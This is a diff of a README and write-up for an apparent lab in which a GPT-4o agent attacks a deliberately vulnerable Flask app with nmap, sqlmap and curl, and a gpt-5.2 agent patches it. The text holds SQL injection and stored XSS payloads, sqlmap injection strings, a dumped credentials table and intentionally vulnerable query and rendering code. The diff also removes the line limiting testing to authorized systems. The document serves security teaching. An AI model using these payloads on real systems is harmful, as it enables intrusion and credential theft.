@@ -3,16 +3,17 @@
 # 🤖⚔️ AI Red Team vs Blue Team Lab
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Python-3.11+-blue?logo=python&logoColor=white"/>
-  <img src="https://img.shields.io/badge/Azure_OpenAI-GPT--4o_&_gpt--5.2-412991?logo=openai&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Red_Agent-GPT--4o-FF4444?logo=openai&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Blue_Agent-GPT--5.2-4488FF?logo=openai&logoColor=white"/>
+  <img src="https://img.shields.io/badge/Azure_OpenAI-Powered-412991?logo=microsoftazure&logoColor=white"/>
   <img src="https://img.shields.io/badge/Docker-Containerized-2496ED?logo=docker&logoColor=white"/>
   <img src="https://img.shields.io/badge/Kali_Linux-Ready-557C94?logo=kalilinux&logoColor=white"/>
   <img src="https://img.shields.io/badge/Phase-2%20Autonomous-orange"/>
-  <img src="https://img.shields.io/badge/License-MIT-green"/>
 </p>
 
 <p align="center">
-  <b>Two AI agents. One attacks. One defends. Fully autonomous closed-loop. Under 2 minutes.</b>
+  <b>Two AI agents. Two different models. One attacks. One defends.<br/>
+  Fully autonomous closed-loop. Under 2 minutes. ~$0.08.</b>
 </p>
 
 </div>
@@ -24,24 +25,25 @@
 | Metric | Phase 1 (PoC) | Phase 2 (Autonomous) |
 |--------|:---:|:---:|
 | 🏗️ App built & deployed | ~15s | ~15s |
-| 💥 Full attack cycle | **70s** | **70s** |
+| 💥 Full attack cycle (nmap → SQLi → XSS) | **70s** | **70s** |
 | 🛡️ Patch generated & redeployed | ~30s | **~30s** |
 | 🔁 Verification loop | manual | **autonomous** |
 | ⏱️ **Total end-to-end** | **< 2 min** | **< 2 min** |
-| 💰 **Total API cost** | ~$0.08 | ~$0.08 |
+| 💰 **Total API cost** | **~$0.08** | **~$0.08** |
 | 👤 **Human intervention** | **Zero** | **Zero** |
 
 ---
 
 ## 🎯 What This Is
 
-A fully autonomous **AI cybersecurity research lab** that runs a complete attack-defend-patch-verify cycle with zero human intervention.
+A fully autonomous **AI cybersecurity research lab** where two different AI models go head-to-head in a real attack-defend-patch-verify cycle.
 
-- 🔵 **Blue Agent** (`gpt-5.2`) builds a deliberately vulnerable Flask/SQLite app and deploys it via Docker
-- 🔴 **Red Agent** (`GPT-4o`) attacks it using `nmap`, `sqlmap`, and `curl`, then writes a structured threat intelligence report
-- 🔵 **Blue Agent** reads the report, patches the code with Defense-in-Depth techniques, and rebuilds the container
-- 🔴 **Red Agent** re-tests the patched code — now acting as a **neutral security auditor**
-- 🧠 **Orchestrator** (`orchestrator.py`) ties everything together in a real-time closed-loop pipeline
+- 🔴 **Red Agent** (`GPT-4o`) attacks using `nmap`, `sqlmap`, and `curl`, then writes a structured threat intelligence report
+- 🔵 **Blue Agent** (`gpt-5.2`) builds the target app, reads the attack report, patches the vulnerabilities with Defense-in-Depth techniques, and rebuilds the container
+- 🔴 **Red Agent** re-tests the patched code — switching roles to act as a **neutral security auditor**
+- 🧠 **Orchestrator** (`orchestrator.py`) ties everything into a real-time closed-loop pipeline
+
+**Key design decision:** Using two different models (GPT-4o vs gpt-5.2) creates genuine asymmetry — each model brings different reasoning patterns to its role, making the experiment more realistic and scientifically honest than a single model playing both sides.
 
 ---
 
@@ -54,37 +56,36 @@ flowchart TD
     O -->|Phase 1: Launch attack| R
 
     subgraph RED ["🔴 Red Agent — GPT-4o"]
-        R[Recon: nmap] --> R2[Exploit: SQLi + XSS]
-        R2 --> R3[Generate threat intelligence report]
+        R[Recon: nmap] --> R2[Exploit: SQLi + XSS\nnmap · sqlmap · curl]
+        R2 --> R3[Generate structured\nthreat intelligence report]
     end
 
-    R3 -->|Structured report| O
+    R3 -->|Attack report + raw logs| O
 
-    O -->|Phase 2: Send report + vulnerable code| B
+    O -->|Phase 2: Report + vulnerable source code| B
 
     subgraph BLUE ["🔵 Blue Agent — gpt-5.2"]
-        B[Analyze attack vectors] --> B2[Rewrite vulnerable code]
-        B2 --> B3[Parameterized Queries\n+ CSP Headers + html.escape]
+        B[Analyze attack vectors\n& vulnerable code] --> B2[Rewrite app.py\nwith secure patterns]
+        B2 --> B3[Parameterized Queries\n+ html.escape + CSP Headers]
     end
 
     B3 -->|Patched app.py| O
 
     O -->|Phase 3: Hot-reload| D
 
-    subgraph DOCKER ["🐳 Docker Container"]
-        D[docker compose down] --> D2[docker compose up --build]
-        D2 --> D3[Patched webapp live\nlocalhost:5000]
+    subgraph DOCKER ["🐳 Docker Container — Python 3.11 / Werkzeug 3.1.8"]
+        D[docker compose down\nRemove infected container] --> D2[docker compose up --build\nBuild from patched code]
+        D2 --> D3[Secure webapp live\nlocalhost:5000]
     end
 
-    D3 -->|Phase 4: Verify patch| O
+    D3 -->|New container running| O
 
-    O -->|Send patched code for audit| R4
+    O -->|Phase 4: Send patched source for audit| R4
 
     subgraph VERIFY ["🔴 Red Agent — Verification Mode"]
-        R4[Simulate previous payloads\nagainst patched code]
-        R4 --> R5{Bypass found?}
-        R5 -->|No| SEC[✅ SECURE — Patches confirmed]
-        R5 -->|Yes| LOOP[🔁 Loop back to Blue Agent]
+        R4[Reason about patched code\nSimulate previous payloads] --> R5{Bypass\nfound?}
+        R5 -->|No| SEC[✅ SECURE\nPatches confirmed]
+        R5 -->|Yes| LOOP[🔁 Loop back\nto Blue Agent]
     end
 
     style O fill:#1a1a2e,color:#fff,stroke:#e94560
@@ -101,28 +102,49 @@ flowchart TD
 ## 🚀 Quick Start
 
 ### Prerequisites
-- Kali Linux (or any Linux with `nmap` + `sqlmap`)
+- Kali Linux (nmap + sqlmap pre-installed)
 - Docker + Docker Compose
-- Azure OpenAI with GPT-4o deployment
+- Azure OpenAI resource with **two deployments**: GPT-4o and gpt-5.2
 - Python 3.11+
 
-### Phase 1 — Step by Step (PoC)
+### 1. Clone & Setup
 
 ```bash
 git clone https://github.com/YOUR_USERNAME/ai-red-blue-lab.git
 cd ai-red-blue-lab
 python3 -m venv venv && source venv/bin/activate
 pip install -r requirements.txt
-cp .env.example .env && nano .env
+```
+
+### 2. Configure Credentials
+
+```bash
+cp .env.example .env
+nano .env   # fill in your Azure keys and deployment names
 python3 test_connection.py
+# Expected output:
+# 🔴 Red Agent (GPT-4o):  ✅ Connection successful. Tokens: 15
+# 🔵 Blue Agent (gpt-5.2): ✅ Connection successful. Tokens: 16
+```
+
+### Phase 1 — Step by Step (PoC)
+
+```bash
+# Deploy vulnerable target
 cd webapp && docker compose up -d --build && cd ..
+
+# Attack
 python3 red_agent/red_agent.py
+
+# Patch
 python3 blue_agent/blue_agent.py
 cd webapp && docker compose down && docker compose up -d --build && cd ..
+
+# Re-test
 bash red_agent/retest.sh
 ```
 
-### Phase 2 — Fully Autonomous
+### Phase 2 — Fully Autonomous (Single Command)
 
 ```bash
 python3 orchestrator.py
@@ -134,22 +156,32 @@ python3 orchestrator.py
 
 ```
 ai-red-blue-lab/
-├── 📄 README.md
+├── 📄 README.md                   ← you are here (includes full write-up)
 ├── 📄 requirements.txt
 ├── 📄 .env.example
-├── 📄 test_connection.py
-├── 🧠 orchestrator.py             ← Phase 2: single command
+├── 📄 test_connection.py          ← verify both model connections
+├── 🧠 orchestrator.py             ← Phase 2: single-command autonomous loop
+│
 ├── 🌐 webapp/
-│   ├── app.py
-│   ├── Dockerfile
+│   ├── app.py                     ← vulnerable → patched Flask app
+│   ├── app.py.backup              ← auto-saved before patch
+│   ├── Dockerfile                 ← Python 3.11-slim
 │   └── docker-compose.yml
+│
 ├── 🔴 red_agent/
-│   ├── red_agent.py
-│   ├── attack.sh
-│   └── retest.sh
+│   ├── red_agent.py               ← GPT-4o powered attack + analysis
+│   ├── attack.sh                  ← nmap + sqlmap + curl pipeline
+│   └── retest.sh                  ← post-patch verification script
+│
 ├── 🔵 blue_agent/
-│   └── blue_agent.py
-└── 📊 logs/                       ← auto-generated
+│   └── blue_agent.py              ← gpt-5.2 powered patch agent
+│
+└── 📊 logs/                       ← auto-generated during run
+    ├── red_team_report.txt        ← raw attack output
+    ├── ai_red_analysis.txt        ← GPT-4o threat intelligence
+    ├── blue_patch_report.txt      ← patched source code
+    ├── retest_report.txt          ← verification results
+    └── sqlmap/                    ← sqlmap session + dumps
 ```
 
 ---
@@ -158,37 +190,46 @@ ai-red-blue-lab/
 
 # 📖 Write-up: When AI Attacks Itself
 
-> **Date:** June 22, 2026 · **Tags:** AI Security · Penetration Testing · AppSec · Autonomous Agents
+> **Date:** June 22, 2026 · **Environment:** Kali Linux VM · Azure OpenAI · Docker  
+> **Tags:** `AI Security` `Penetration Testing` `AppSec` `Autonomous Agents` `GPT-4o` `gpt-5.2`
 
 ---
 
 ## The Idea I Couldn't Get Out of My Head
 
-What if two AI agents fought each other — one building and defending a web application, the other trying to break in? No human intervention. No waiting. No typos in terminal commands.
+What if two AI agents fought each other — one building and defending a web application, the other trying to break in? Two different models. No human intervention. No waiting. No typos in terminal commands.
 
 I ran the experiment. The results were more interesting than I expected — not just because the attack and defense both worked, but because of **how fast everything happened**.
 
 ---
 
-## Phase 1: Proof of Concept
+## The Setup
 
-### The Setup
+**Two models. Two roles. One isolated Kali Linux VM.**
 
 | Agent | Model | Role |
 |-------|-------|------|
-| 🔵 Blue Agent | gpt-5.2 | Build target, patch vulnerabilities |
-| 🔴 Red Agent | GPT-4o | Attack, analyze, re-test |
+| 🔴 Red Agent | GPT-4o (Azure OpenAI) | Attack, analyze findings, verify patch |
+| 🔵 Blue Agent | gpt-5.2 (Azure OpenAI) | Build target app, patch vulnerabilities |
 
-Target: a Flask/SQLite web app inside Docker, intentionally built with two classic vulnerabilities.
+**Target stack:** Flask · SQLite · Werkzeug 3.1.8 · Python 3.11.15 · Docker
+
+**Why two different models?** Using GPT-4o for offense and gpt-5.2 for defense creates genuine asymmetry — each model brings different reasoning patterns to its role. A single model playing both sides would produce biased results.
+
+**A note on tooling:** We started with AutoGen for agent orchestration, but hit a library conflict — AutoGen's bundled `openai` v0.x clashed with the modern `openai` v1.x SDK. We scrapped it and called the Azure OpenAI API directly. Simpler, faster, no magic.
 
 ---
 
+## Phase 1: Proof of Concept
+
 ### Act 1 — Blue Agent Builds the Target ⏱️ 15 seconds
+
+Blue Agent (`gpt-5.2`) was given one instruction: build a Flask/SQLite web app, deploy it via Docker, and intentionally leave two vulnerabilities in it for the experiment.
 
 **Vulnerability 1: SQL Injection**
 
 ```python
-# ❌ Raw string interpolation
+# ❌ User input injected directly into SQL query
 query = f"SELECT * FROM users WHERE username='{user}' AND password='{pwd}'"
 cur.execute(query)
 ```
@@ -196,39 +237,66 @@ cur.execute(query)
 **Vulnerability 2: Stored XSS**
 
 ```python
-# ❌ Unsanitized output
+# ❌ Raw user input stored and rendered without sanitization
 comments_html = "".join(f"<p>{r[0]}</p>" for r in rows)
 ```
 
+The database was pre-seeded with two users: `admin:secret123` and `alice:pass456`.
+
 From script execution to `Container vulnerable-webapp Started`: **15 seconds**.
+
+```bash
+$ curl -s http://localhost:5000/login | grep -o "<h2>.*</h2>"
+<h2>Login</h2>   # ✅ App is live on port 5000
+```
 
 ---
 
 ### Act 2 — Red Agent Attacks ⏱️ 70 seconds
 
-**Recon — nmap (6 seconds)**
+Red Agent (`GPT-4o`) ran a four-phase attack script automatically.
+
+**Phase 1 — Reconnaissance: nmap (6.38 seconds)**
+
 ```
 PORT     STATE SERVICE VERSION
 5000/tcp open  http    Werkzeug httpd 3.1.8 (Python 3.11.15)
 ```
 
-**Manual SQL Injection (< 1 second)**
+Framework version fingerprinted. We know what we're dealing with.
+
+**Phase 2 — Manual SQL Injection (< 1 second)**
+
 ```
 Payload:  admin' OR '1'='1
 Response: ✅ Welcome admin!
 ```
 
-**sqlmap automated scan (10 seconds)**
+Login bypassed on the first attempt. Classic OR-based injection.
 
-Three injection techniques found on the same parameter:
+**Phase 3 — sqlmap Automated Scan (10 seconds)**
+
+sqlmap automatically identified the backend as SQLite, then found **three injection techniques** on the same `username` parameter:
+
 ```
-- boolean-based blind
-- time-based blind
-- UNION query
+Type: boolean-based blind
+Payload: username=admin' AND CASE WHEN 1348=1348 THEN 1348
+         ELSE JSON(CHAR(69,74,90,69)) END AND 'xgKy'='xgKy
+
+Type: time-based blind
+Payload: username=admin' AND 7314=LIKE(CHAR(65,66,67,68,69,70,71),
+         UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'fesM'='fesM
+
+Type: UNION query (3 columns)
+Payload: username=-5323' UNION ALL SELECT NULL,CHAR(113,120,112,107,113)
+         ||CHAR(70,109,100,...)||CHAR(113,120,118,106,113),NULL-- qZAZ
 ```
 
-Full database dumped:
+Then dumped the entire users table — 100 HTTP requests total:
+
 ```
+Database: SQLite_masterdb
+Table: users
 +----+-----------+----------+
 | id | password  | username |
 +----+-----------+----------+
@@ -237,122 +305,184 @@ Full database dumped:
 +----+-----------+----------+
 ```
 
-**Stored XSS (< 1 second)**
+**Phase 4 — Stored XSS (< 1 second)**
+
 ```
-Payload: <script>alert("XSS_PWNED")</script>
-Result:  ✅ Stored and reflected — executes in browser
+Payload stored:   <script>alert("XSS_PWNED")</script>
+Reflected back:   ✅ Script tag present — executes in any victim's browser
 ```
 
-**Total: 70 seconds. 100 HTTP requests. Every credential stolen.**
+**Total: 70 seconds. 100 HTTP requests. Every credential stolen. XSS payload live.**
 
-GPT-4o then analyzed its own findings:
+GPT-4o then analyzed its own attack output and produced a structured threat intelligence report:
 
 | Vulnerability | Severity | Impact |
 |---|---|---|
-| SQL Injection | **Critical** | Full database compromise |
-| Stored XSS | **High** | Arbitrary JS execution on victims |
+| SQL Injection | **Critical** | Full database compromise, authentication bypass |
+| Stored XSS | **High** | Arbitrary JavaScript execution on all visitors |
 
-*Cost: 4,667 tokens — roughly $0.05.*
+*API cost for this analysis: 4,667 tokens — roughly $0.05.*
 
 ---
 
 ### Act 3 — Blue Agent Patches the Code ⏱️ 30 seconds
 
-The attack report was passed directly to Blue Agent with the vulnerable source. No human summarized anything.
+The GPT-4o threat report was passed directly to Blue Agent (`gpt-5.2`) along with the vulnerable `app.py`. No human read the report. No human wrote the fix.
 
 **Fix 1: Parameterized Queries**
+
 ```python
-# ✅ User input never touches SQL syntax
+# ✅ SQL logic and user data are now completely separated
 cur.execute("SELECT * FROM users WHERE username=? AND password=?", (user, pwd))
 ```
 
-**Fix 2: Output Encoding + CSP**
+The database driver handles escaping. User input is always treated as a literal value — never as SQL syntax.
+
+**Fix 2: Output Encoding + CSP Header**
+
 ```python
-# ✅ Neutralized at render time
+# ✅ Special characters neutralized before rendering
 import html
 comments_html = "".join(f"<p>{html.escape(r[0])}</p>" for r in rows)
-# + Content-Security-Policy: script-src 'self'
+# + Content-Security-Policy: script-src 'self'  (added to response headers)
 ```
 
-Docker rebuilt in the background. *Cost: 2,561 tokens.*
+Blue Agent automatically saved a backup of the original file (`app.py.backup`), wrote the patched version, and the orchestrator triggered a Docker rebuild:
+
+```bash
+[+] Building 1.6s (11/11) FINISHED
+✔ Container vulnerable-webapp  Started ✅
+```
+
+*API cost for patch generation: 2,561 tokens.*
 
 ---
 
 ### Act 4 — Red Agent Confirms the Fix ⏱️ 3 seconds
 
+Same payloads. Same tools. Different result.
+
+**SQL Injection — blocked**
 ```bash
-Payload: admin' OR '1'='1        →  ❌ Invalid credentials
-sqlmap full scan                  →  "all tested parameters do not appear to be injectable"
-<script>alert("XSS_PWNED")</script>  →  &lt;script&gt;alert(&quot;XSS_PWNED&quot;)&lt;/script&gt;
+Payload: admin' OR '1'='1
+Result:  ❌ Invalid credentials
 ```
 
-| Vulnerability | Before | After |
+**sqlmap — full arsenal, nothing found**
+```
+[WARNING] POST parameter 'username' does not seem to be injectable
+[WARNING] POST parameter 'password' does not seem to be injectable
+[CRITICAL] all tested parameters do not appear to be injectable.
+```
+
+sqlmap tried everything. Boolean-based, time-based, UNION — all failed.
+
+**Stored XSS — escaped**
+```bash
+Input:  <script>alert("XSS_PWNED")</script>
+Output: &lt;script&gt;alert(&quot;XSS_PWNED&quot;)&lt;/script&gt;
+```
+
+Stored as plain text. Browser renders it, doesn't execute it.
+
+**Legitimate login still works:**
+```bash
+username=admin&password=secret123  →  ✅ Welcome admin!
+```
+
+The patch didn't break anything.
+
+| Vulnerability | Before Patch | After Patch |
 |---|---|---|
-| SQL Injection (manual) | ❌ Exploited | ✅ Blocked |
-| SQL Injection (sqlmap) | ❌ Full DB dump | ✅ Not injectable |
-| Stored XSS | ❌ Executed | ✅ Escaped |
+| SQL Injection — manual | ❌ Exploited | ✅ Blocked |
+| SQL Injection — sqlmap | ❌ Full DB dumped | ✅ Not injectable |
+| Stored XSS | ❌ Script executed | ✅ Escaped to plain text |
 | Legitimate login | ✅ Works | ✅ Still works |
 
 ---
 
 ## Phase 2: Fully Autonomous Closed-Loop
 
-Phase 1 proved the concept. Phase 2 eliminated the last traces of human involvement.
+Phase 1 proved the concept with manual handoffs between steps. Phase 2 eliminated them entirely.
 
-`orchestrator.py` connects both agents in a real-time feedback loop. The critical engineering decision: in the verification phase, Red Agent doesn't re-run shell commands — it receives the actual patched Python source and **reasons** about whether its previous payloads could succeed against the new logic. Security reasoning, not tool re-execution.
+`orchestrator.py` connects both agents in a **Closed-Loop Feedback System** — a self-healing security pipeline that runs start-to-finish with a single command.
 
-### Live Output
+**The critical engineering decision in Phase 4:** Red Agent doesn't just re-run `attack.sh`. It receives the actual patched Python source code and *reasons* about whether its previous payloads could succeed against the new logic. This is code-level security analysis, not blind tool re-execution. The model has to understand why the patch works — or find a gap if it doesn't.
+
+### Live Orchestrator Output
 
 ```
 🚀 Starting Joint Operations Room: Red Team vs Blue Team...
+==================================================
 
-🔥 [Phase 1] Launching Red Agent...
+🔥 [Phase 1] Launching Red Agent (GPT-4o)...
 📝 Red Agent successfully generated attack report!
 
-🛡️ [Phase 2] Orchestrator hands report to Blue Agent...
-🛠️ Blue Agent patched the code and rewrote the file automatically!
+🛡️ [Phase 2] Orchestrator hands report to Blue Agent (gpt-5.2)...
+🛠️ Blue Agent patched the code and rewrote app.py automatically!
 
-🐳 [Phase 3] Orchestrator rebuilds Docker with new code...
-🔄 Container updated.
+🐳 [Phase 3] Orchestrator rebuilds Docker with patched code...
+🔄 Container updated. Secure version now live.
 
-🎯 [Phase 4] Calling Red Agent for verification...
+🎯 [Phase 4] Calling Red Agent for verification audit...
 
 ==================================================
-1. SQL Injection → ❌ BLOCKED (Parameterized queries)
-2. Stored XSS    → ❌ BLOCKED (html.escape + CSP)
+🏁 Final Verification Report:
+
+1. SQL Injection Analysis:
+   Patched: cur.execute("SELECT ... WHERE username=?", (user,))
+   Payload: admin' OR '1'='1
+   Result:  ❌ BLOCKED — Parameterized queries neutralize the injection.
+
+2. Stored XSS Analysis:
+   Patched: html.escape() + Content-Security-Policy: script-src 'self'
+   Payload: <script>alert('XSS')</script>
+   Result:  ❌ BLOCKED — Rendered as &lt;script&gt;. CSP blocks inline JS.
 
 System Status: SECURE 🛡️
 ==================================================
 ```
 
-### Why the CSP Header Matters
+### Why the CSP Header Is the Interesting Part
 
-Blue Agent added two independent layers without being asked:
+Blue Agent applied **Defense-in-Depth** without being asked for it:
 
-- `html.escape()` converts `<script>` to `&lt;script&gt;` — display as text
-- `Content-Security-Policy: script-src 'self'` — browser refuses all inline JS
+- Layer 1: `html.escape()` converts `<script>` → `&lt;script&gt;` at the Python level
+- Layer 2: `Content-Security-Policy: script-src 'self'` tells the browser to refuse any inline JavaScript, even if it somehow gets through encoding
 
-Both must fail simultaneously for the attack to succeed. That's **Defense-in-Depth** — and the model applied it unprompted.
+Both layers must fail simultaneously for XSS to succeed. The model reasoned about this independently — it wasn't in the prompt.
 
 ---
 
 ## The Complete Timeline
 
 ```
-18:36:58  🔵 Blue Agent builds app → Docker starts         ~15s
-18:37:06  🔴 Red Agent attacks
-           ├── nmap: Werkzeug 3.1.8 fingerprinted
-           ├── SQLi: login bypassed on first payload
-           ├── sqlmap: full DB dump in 10 seconds
-           └── XSS: stored successfully               ~70s total
-18:37:16  🤖 GPT-4o threat analysis                   1 call · 4,667 tokens
-          🔵 Blue Agent patches code                  1 call · 2,561 tokens
-          🐳 Docker rebuild                           ~20s
-19:44:16  🔴 Re-test: everything blocked              3s
-─────────────────────────────────────────────────────────
-⏱️  Full cycle: < 2 minutes
-💰  Total cost: ~$0.08
-👤  Human intervention: zero
+18:36:58  🔵 Blue Agent (gpt-5.2) builds app → Docker starts
+          └── ~15 seconds
+
+18:37:06  🔴 Red Agent (GPT-4o) begins attack
+          ├── nmap: Werkzeug 3.1.8 / Python 3.11.15 fingerprinted (6.38s)
+          ├── SQLi: login bypassed on first payload (<1s)
+          ├── sqlmap: 3 injection types found, full DB dump (10s)
+          └── XSS: payload stored and reflected (<1s)
+          └── 70 seconds total · 100 HTTP requests
+
+18:37:16  🤖 GPT-4o analyzes findings → structured threat report
+          └── 1 API call · 4,667 tokens · ~$0.05
+
+          🔵 gpt-5.2 reads report → patches app.py
+          └── 1 API call · 2,561 tokens · ~$0.03
+
+          🐳 Docker rebuild with patched code
+          └── ~20 seconds (cached layers)
+
+19:44:16  🔴 GPT-4o re-tests patched app
+          └── sqlmap: not injectable · XSS: escaped · 3 seconds
+
+──────────────────────────────────────────────────────────
+⏱️  Full cycle, start to finish:  < 2 minutes
+💰  Total Azure OpenAI cost:      ~$0.08
+👤  Human intervention:           zero
 ```
 
 ---
@@ -360,29 +490,29 @@ Both must fail simultaneously for the attack to succeed. That's **Defense-in-Dep
 ## What This Actually Means
 
 **Speed is the real shift.**
-What traditionally takes days between a Red Team report and a deployed fix happened in under two minutes. Not because AI is smarter than a human engineer — because it doesn't stop.
+What traditionally takes days — Red Team engagement, developer reads report, writes fix, gets it reviewed, deploys — happened in under two minutes. Not because AI is smarter than a human security engineer. Because it doesn't stop, doesn't need context-switching, and doesn't wait for a Slack reply.
 
 **Two models beat one.**
-GPT-4o for attack and gpt-5.2 for defense created genuine asymmetry. Each model brought different reasoning to its role.
+GPT-4o on offense and gpt-5.2 on defense created genuine asymmetry. The experiment would have been less honest — and less interesting — with a single model playing both sides.
+
+**Ditch the framework when it fights you.**
+AutoGen looked good on paper. When its bundled openai v0.x clashed with our openai v1.x, we spent zero time debugging it and just called the API directly. Sometimes the abstraction isn't worth it.
 
 **AI doesn't invent, it compresses.**
-OWASP Top 10 vulnerabilities. Public tools. Documented fixes. AI collapsed the time between knowing and doing.
+SQL Injection is in OWASP Top 10. sqlmap is public. Parameterized queries are documented everywhere. What AI did here was collapse the time between *knowing* and *doing* — from days to seconds.
 
 **The real implication.**
-If an attacker automates a full recon-exploit-report cycle in 70 seconds, the defender's response window shrinks to something only automation can match.
+If an attacker can automate a full recon-exploit-report cycle in 70 seconds for $0.05, the defender's response window shrinks to something only automation can match. This experiment is a small demonstration of that pressure.
 
 ---
 
 ## What's Next
 
-- [ ] Add CSRF and IDOR vulnerabilities and repeat
-- [ ] Test whether Red Agent finds vulnerabilities it wasn't told about
-- [ ] Pit different models against each other and measure outcomes
-- [ ] Build a real-time dashboard for the orchestration loop
-
----
-
-> *All tests conducted in a completely isolated VM environment. Never apply these techniques to systems without explicit written permission.*
+- [ ] Add CSRF and IDOR to the target app and repeat
+- [ ] Test whether Red Agent can find vulnerabilities it wasn't told about
+- [ ] Pit GPT-4o vs gpt-5.2 in both roles and compare outcomes
+- [ ] Build a real-time terminal dashboard for the orchestration loop
+- [ ] Extend to DAST scanning with OWASP ZAP
 
 ---
 
@@ -396,45 +526,41 @@ If an attacker automates a full recon-exploit-report cycle in 70 seconds, the de
 
 ## 🤝 Contributing
 
-Contributions are welcome! Here are some ideas to get you started:
+Contributions are welcome — here are concrete ideas:
 
-**🔴 Red Team improvements**
-- Add more attack vectors: CSRF, IDOR, Path Traversal, Command Injection
+**🔴 Red Team**
+- Add CSRF, IDOR, Path Traversal, Command Injection attack modules
 - Integrate OWASP ZAP for deeper automated scanning
-- Make Red Agent discover vulnerabilities it wasn't told about
+- Make Red Agent discover vulnerabilities without being told what to look for
 
-**🔵 Blue Agent improvements**
-- Test different models and compare patch quality
-- Add automatic rollback if patched app breaks functionality
-- Implement multi-layer defense suggestions (WAF rules, rate limiting)
+**🔵 Blue Agent**
+- Compare patch quality across different models
+- Add automatic rollback if the patched app fails a smoke test
+- Implement WAF rule generation alongside code fixes
 
-**🧠 Orchestrator improvements**
-- Add a real-time terminal dashboard (rich / textual)
-- Implement a true loop: if Red Agent finds a bypass, send back to Blue Agent automatically
-- Log token usage and cost per phase for benchmarking
+**🧠 Orchestrator**
+- Real-time terminal dashboard (`rich` / `textual`)
+- True feedback loop: if Red Agent finds a bypass → automatically re-engage Blue Agent
+- Per-phase token usage and cost logging
 
-**📊 Research directions**
-- Benchmark GPT-4o vs other models in attack effectiveness
-- Measure patch quality: does the model over-patch or under-patch?
-- Test against a more complex multi-page app
+**📊 Research**
+- Benchmark GPT-4o vs other models on attack effectiveness
+- Measure patch quality: over-patch vs under-patch vs correct
+- Test on a more complex multi-service application
 
-**To contribute:**
 ```bash
-# 1. Fork the repo
-# 2. Create your branch
 git checkout -b feature/your-idea
-
-# 3. Commit and push
 git commit -m "feat: your improvement"
 git push origin feature/your-idea
-
-# 4. Open a Pull Request
+# then open a Pull Request — direct pushes to main are blocked
 ```
 
-Found a bug or have an idea? [Open an issue](https://github.com/YOUR_USERNAME/ai-red-blue-lab/issues) — all feedback is appreciated.
+Found a bug or have an idea? [Open an issue](https://github.com/YOUR_USERNAME/ai-red-blue-lab/issues)
 
 ---
 
 <div align="center">
-  <sub>Built with Azure OpenAI · Tested on Kali Linux · Automated with Python · Zero Human Intervention</sub>
+  <sub>
+    🔴 GPT-4o attacks · 🔵 gpt-5.2 defends · 🧠 Python orchestrates · 🐳 Docker isolates · ⏱️ 2 minutes total
+  </sub>
 </div>
